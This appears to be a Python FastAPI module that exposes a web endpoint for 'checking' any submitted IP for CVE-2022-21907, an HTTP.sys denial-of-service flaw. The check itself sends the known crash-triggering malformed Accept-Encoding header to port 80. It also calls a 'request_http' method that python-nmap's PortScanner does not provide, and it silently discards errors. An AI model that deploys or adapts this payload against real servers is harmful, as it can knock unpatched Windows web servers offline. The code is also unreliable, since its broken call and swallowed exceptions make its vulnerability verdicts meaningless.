from fastapi import APIRouter
import nmap

router = APIRouter()



def check_cve_2022_21907(target):
    nm = nmap.PortScanner()
    target_port = 80

    def check_vulnerability(host, port):
        headers = {
            "accept-encoding": "AAAAAAAAAAAAAAAAAAAA, AAAAAAAAAAAAAAAAAAAAAAAAA" +
                               "BBBBBBBBBBBBBBBBBBBBBBBBBBB&AAAA&**BBBBBBBBBBBBBBBBBb**BBBBBBBBBB, " +
                               "CCCCC**CCCCCCCCCCCCCCCCC,CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC" +
                               "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC, " +
                               "DDDDDDDDDDDDDDDDDDDd,DDDDDDDDDDDDDDDDDDD,************DDDDDDDDDDDD, " +
                               "DDDDDDD****************DDDDDDDD, *, ,"
        }

        try:
            response = nm.request_http(target, port, "/", headers=headers)

            if response and 'status' in response:
                if response['status'] is None:
                    return "CVE-2022-21907 - DOS: Likely Vulnerable"
        except Exception as e:
            pass

        return "CVE-2022-21907 - DOS: Not Vulnerable"

    nm.scan(hosts=target, ports=str(target_port), arguments="-Pn")
    host_status = nm[target]['status']['state']

    if host_status == 'up':
        result = check_vulnerability(target, target_port)
        return f"{target}:{target_port} - {result}"
    else:
        return f"{target}:{target_port} - Host is down"
    
@router.post("/check-cve")
async def check_cve(target_ip: str):
    result = check_cve_2022_21907(target_ip)
    return {"result": result}